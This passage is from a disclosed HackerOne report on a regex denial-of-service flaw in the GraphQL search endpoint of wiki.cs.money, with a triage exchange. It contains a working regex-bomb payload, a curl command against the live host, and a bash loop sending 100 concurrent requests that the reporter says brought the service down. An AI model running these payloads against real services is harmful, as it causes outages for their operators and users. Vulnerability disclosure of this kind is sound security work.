{"id":1000567,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAwNTY3","url":"https://hackerone.com/reports/1000567","title":"ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-10-07T02:26:35.265Z","submitted_at":"2020-10-07T02:26:35.361Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mvm","url":"/mvm","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":48311,"url":"https://hackerone.com/cs_money","handle":"cs_money","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"CS Money","twitter_handle":"csmoneytrade","website":"https://cs.money","about":"CS:GO trading platform that helps people to trade, buy, sell and search for the best skins and deals they could possibly find."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-10-27T19:30:34.805Z","bug_reporter_agreed_on_going_public_at":"2020-10-16T15:33:28.140Z","team_member_agreed_on_going_public_at":"2020-10-27T19:30:34.713Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThe endpoint /graphql has a vulnerable query operation named \"search\", that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. \n\n+ Payload with a \"common\" search, querying the value \"AAA\":\n\n```\nquery a { \n  search(q: \"AAA\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n \n }\n}\n```\n\nResponse:\n\n```\n{\n  \"data\": {\n    \"search\": [\n      {\n        \"_id\": \"sticker-baaa-ckstabber\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      },\n      {\n        \"_id\": \"sticker-ork-waaagh\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      }\n    ]\n  },\n  \"extensions\": {\n    \"tracing\": {\n      \"version\": 1,\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n      \"duration\": 264270190,\n      \"execution\": {\n        \"resolvers\": [\n          {\n            \"path\": [\n              \"search\"\n            ],...[Resumed for convenience]\n        ]\n      }\n    }\n  }\n}\n```\n\nPay attention in this part of JSON response: \n\n```\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n``` \n\n**It's about a instantaneously response time.**\n\nOk, now we're ready to play with this...\n\nYou can reveal the bug inserting \"\\u0000\" on \"q\" parameter, in order to display an error with part of the graph query.\n\n+ Payload A (see the error response):\n\n ```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n ```\n\nResponse:\n\n```\n{\n  \"errors\": [\n    {\n      \"message\": \"value (?=.*\\u0000) must not contain null bytes\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n      ],\n      \"path\": [\n        \"search\"\n      ],\n      \"extensions\": {\n        \"code\": \"INTERNAL_SERVER_ERROR\"\n      }\n    }\n  ],\n....[Resumed]\n ```\n\n+ Payload B (reveal that this parameter filter a value with a regex)\n\n```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n\n```\n\n Response:\n\n ```\n{\n  \"errors\": [\n    {\n      \"message\": \"Invalid regular expression: /(?=.*X))/: Unmatched ')'\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n...[Resumed]\n\n```\n\n\n## GraphQL Payload With Regex BOMB\n\n```\nquery a { \n  search(q: \"[a-zA-Z0-9]+\\\\s?)+$|^([a-zA-Z0-9.'\\\\w\\\\W]+\\\\s?)+$\\\\\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n }\n}\n```\n\n\n## Steps To Reproduce:\n  1. Send a POST with the bomb payload: \n\n       ````\n   curl 'https://wiki.cs.money/graphql' \\  \n  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \\\n  -H 'content-type: application/json' \\\n  -H 'accept: */*' \\     \n  --data-binary $'{\"query\":\"query a { \\\\n  search(q: \\\\\"[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\'\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\", lang: \\\\\"en\\\\\") {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\",\"variables\":null}' \\\n  --compressed\n       ```\n  1. Compare response times with a simple query \"AAA\"  (explained above)\n \n\n## Supporting Material/References:\nhttps://www.rexegg.com/regex-explosive-quantifiers.html\n\n## Impact\n\nDenial of Service","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eThe endpoint /graphql has a vulnerable query operation named \u0026quot;search\u0026quot;, that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePayload with a \u0026quot;common\u0026quot; search, querying the value \u0026quot;AAA\u0026quot;:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery a { \n  search(q: \u0026quot;AAA\u0026quot;, lang: \u0026quot;en\u0026quot;) {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n\n }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;data\u0026quot;: {\n    \u0026quot;search\u0026quot;: [\n      {\n        \u0026quot;_id\u0026quot;: \u0026quot;sticker-baaa-ckstabber\u0026quot;,\n        \u0026quot;weapon_id\u0026quot;: null,\n        \u0026quot;rarity\u0026quot;: \u0026quot;High Grade\u0026quot;,\n        \u0026quot;collection\u0026quot;: null,\n        \u0026quot;collection_id\u0026quot;: null\n      },\n      {\n        \u0026quot;_id\u0026quot;: \u0026quot;sticker-ork-waaagh\u0026quot;,\n        \u0026quot;weapon_id\u0026quot;: null,\n        \u0026quot;rarity\u0026quot;: \u0026quot;High Grade\u0026quot;,\n        \u0026quot;collection\u0026quot;: null,\n        \u0026quot;collection_id\u0026quot;: null\n      }\n    ]\n  },\n  \u0026quot;extensions\u0026quot;: {\n    \u0026quot;tracing\u0026quot;: {\n      \u0026quot;version\u0026quot;: 1,\n      \u0026quot;startTime\u0026quot;: \u0026quot;2020-10-07T02:07:55.251Z\u0026quot;,\n      \u0026quot;endTime\u0026quot;: \u0026quot;2020-10-07T02:07:55.516Z\u0026quot;,\n      \u0026quot;duration\u0026quot;: 264270190,\n      \u0026quot;execution\u0026quot;: {\n        \u0026quot;resolvers\u0026quot;: [\n          {\n            \u0026quot;path\u0026quot;: [\n              \u0026quot;search\u0026quot;\n            ],...[Resumed for convenience]\n        ]\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePay attention in this part of JSON response: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e      \u0026quot;startTime\u0026quot;: \u0026quot;2020-10-07T02:07:55.251Z\u0026quot;,\n      \u0026quot;endTime\u0026quot;: \u0026quot;2020-10-07T02:07:55.516Z\u0026quot;,\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eIt\u0026#39;s about a instantaneously response time.\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eOk, now we\u0026#39;re ready to play with this...\u003c/p\u003e\n\n\u003cp\u003eYou can reveal the bug inserting \u0026quot;\\u0000\u0026quot; on \u0026quot;q\u0026quot; parameter, in order to display an error with part of the graph query.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePayload A (see the error response):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery a { \n  search(q: \u0026quot;\\u0000)\u0026quot;, lang: \u0026quot;en\u0026quot;) {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;errors\u0026quot;: [\n    {\n      \u0026quot;message\u0026quot;: \u0026quot;value (?=.*\\u0000) must not contain null bytes\u0026quot;,\n      \u0026quot;locations\u0026quot;: [\n        {\n          \u0026quot;line\u0026quot;: 2,\n          \u0026quot;column\u0026quot;: 3\n        }\n      ],\n      \u0026quot;path\u0026quot;: [\n        \u0026quot;search\u0026quot;\n      ],\n      \u0026quot;extensions\u0026quot;: {\n        \u0026quot;code\u0026quot;: \u0026quot;INTERNAL_SERVER_ERROR\u0026quot;\n      }\n    }\n  ],\n....[Resumed]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ePayload B (reveal that this parameter filter a value with a regex)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery a { \n  search(q: \u0026quot;\\u0000)\u0026quot;, lang: \u0026quot;en\u0026quot;) {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;errors\u0026quot;: [\n    {\n      \u0026quot;message\u0026quot;: \u0026quot;Invalid regular expression: /(?=.*X))/: Unmatched \u0026#39;)\u0026#39;\u0026quot;,\n      \u0026quot;locations\u0026quot;: [\n        {\n          \u0026quot;line\u0026quot;: 2,\n          \u0026quot;column\u0026quot;: 3\n        }\n...[Resumed]\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"graphql-payload-with-regex-bomb\"\u003eGraphQL Payload With Regex BOMB\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery a { \n  search(q: \u0026quot;[a-zA-Z0-9]+\\\\s?)+$|^([a-zA-Z0-9.\u0026#39;\\\\w\\\\W]+\\\\s?)+$\\\\\u0026quot;, lang: \u0026quot;en\u0026quot;) {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eSend a POST with the bomb payload: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;https://wiki.cs.money/graphql\u0026#39; \\  \n-H \u0026#39;user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36\u0026#39; \\\n-H \u0026#39;content-type: application/json\u0026#39; \\\n-H \u0026#39;accept: */*\u0026#39; \\     \n--data-binary $\u0026#39;{\u0026quot;query\u0026quot;:\u0026quot;query a { \\\\n  search(q: \\\\\u0026quot;[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\\u0026#39;\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\u0026quot;, lang: \\\\\u0026quot;en\\\\\u0026quot;) {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\u0026quot;,\u0026quot;variables\u0026quot;:null}\u0026#39; \\\n--compressed\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCompare response times with a simple query \u0026quot;AAA\u0026quot;  (explained above)\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.rexegg.com/regex-explosive-quantifiers.html\" href=\"/redirect?url=https%3A%2F%2Fwww.rexegg.com%2Fregex-explosive-quantifiers.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.rexegg.com/regex-explosive-quantifiers.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of Service\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1023378,"file_name":"recording-bug.webm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mJmNfYwb7RG7ADxYGcyYdMUM?response-content-disposition=attachment%3B%20filename%3D%22recording-bug.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-bug.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041050Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=1c507620be96ee463231c0808e9fa449eb0d72685fa02871234697fd8c1be912","file_size":4258739,"type":"video/webm"}],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["mygf","elmahdi","since2003","rootishere","zeltric","flok33","wqfrwefe","danchoidq9"],"severity":{"rating":"medium","score":5.7,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":45904,"asset_type":"URL","asset_identifier":"wiki.cs.money","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9452530,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ReDos is really done with a simple machine. \nI tried with one tab of chrome attacking with regex bomb, and other tree tabs on different browsers with a simple filter with \"a\" value (at same time), and all the requests was slowed about 40 seconds and it's not about the TTFB, but the two timespans returned from responses (startTime and endTime)\n","markdown_message":"\u003cp\u003eReDos is really done with a simple machine. \u003cbr\u003e\nI tried with one tab of chrome attacking with regex bomb, and other tree tabs on different browsers with a simple filter with \u0026quot;a\u0026quot; value (at same time), and all the requests was slowed about 40 seconds and it\u0026#39;s not about the TTFB, but the two timespans returned from responses (startTime and endTime)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-07T20:41:55.183Z","updated_at":"2020-10-07T20:41:55.183Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9456559,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey!\nThis might be for the simple reason that server is not responding to you.\nWe had a lot of similar reports lately, none of them were actually DoS causing.","markdown_message":"\u003cp\u003eHey!\u003cbr\u003e\nThis might be for the simple reason that server is not responding to you.\u003cbr\u003e\nWe had a lot of similar reports lately, none of them were actually DoS causing.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-08T09:19:53.005Z","updated_at":"2020-10-08T09:19:53.005Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9458618,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"First of all, sorry about by this test. the intention was demonstrate the vulnerability, not DoS graphQL totally.\n\nThe apollo server is responding, but with a huge latency when then regex has been processed by node.js backend (apollo-server) on a single request of the payload.\nI made a lot of tests in order to conclude that is the regex the root cause of delay.\n\n##Steps to Reproduce\n1.  execute the attacker (bash with a for loop that runs 100x curl command with the payload).\n\n     ```\n#!/bin/bash\nRED='\\033[0;31m'\nY='\\033[0;33m'\nNC='\\033[0m' # No Color\nprintf  \"${Y}================================================================\\n\"\nprintf  \"${Y}====================${NC} EXECUTING THE PAYLOAD ON ${Y}=======================\\n\"\nprintf  \"${NC}https://wiki.cs.money/graphql ${Y}========\\n\"\nprintf  \"${Y}================================================================${NC}\\n\"\nfor i in {1..100}; do curl 'https://wiki.cs.money/graphql'  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'      --data-binary $'{\"query\":\"query a { \\\\n  search(q: \\\\\"[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\'\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\", lang: \\\\\"en\\\\\") {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\",\"variables\":null}' --compressed  \u0026 done\n\n     ```\n2. Your service (graphql) was down after test.\n3. Simple that.\n\n","markdown_message":"\u003cp\u003eFirst of all, sorry about by this test. the intention was demonstrate the vulnerability, not DoS graphQL totally.\u003c/p\u003e\n\n\u003cp\u003eThe apollo server is responding, but with a huge latency when then regex has been processed by node.js backend (apollo-server) on a single request of the payload.\u003cbr\u003e\nI made a lot of tests in order to conclude that is the regex the root cause of delay.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to Reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eexecute the attacker (bash with a for loop that runs 100x curl command with the payload).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"nv\"\u003eRED\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\033[0;31m\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\033[0;33m\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003eNC\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\033[0m\u0026#39;\u003c/span\u003e \u003cspan class=\"c\"\u003e# No Color\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e================================================================\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e====================\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNC\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e EXECUTING THE PAYLOAD ON \u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e=======================\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNC\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://wiki.cs.money/graphql \u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e========\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eY\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e================================================================\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNC\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor \u003c/span\u003ei \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e1..100\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo \u003c/span\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://wiki.cs.money/graphql\u0026#39;\u003c/span\u003e  \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;content-type: application/json\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;accept: */*\u0026#39;\u003c/span\u003e      \u003cspan class=\"nt\"\u003e--data-binary\u003c/span\u003e \u003cspan class=\"s1\"\u003e$\u0026#39;{\u0026quot;query\u0026quot;:\u0026quot;query a { \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en  search(q: \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;[a-zA-Z0-9]+\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003es?)+$|^([a-zA-Z0-9.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ew\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003eW]+\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003es?)+$\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;, lang: \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;en\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;) {\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en    _id\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en   weapon_id\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en    rarity\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en    collection{ _id name }\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en    collection_id \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en 